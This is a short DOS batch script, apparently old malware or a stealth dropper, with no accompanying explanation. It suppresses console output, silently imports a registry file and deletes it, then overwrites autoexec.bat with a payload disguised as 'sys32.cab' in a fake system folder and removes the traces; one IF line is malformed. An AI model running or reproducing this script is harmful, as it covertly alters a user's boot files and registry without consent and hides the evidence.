@echo off 
ctty nul 
IF  ==oki goto 546 
goto 645 
:645 
regedit t.reg 
del t.reg 
copy autoexec.bat aut.bat  
aut.bat oki  
goto end 
:546 
del autoexec.bat 
copy windows\sys32bak\sys32.cab \autoexec.bat 
cd windows 
del sys32bak\sys32.cab 
rd sys32bak 
cd\  
del aut.bat  
:end  
  
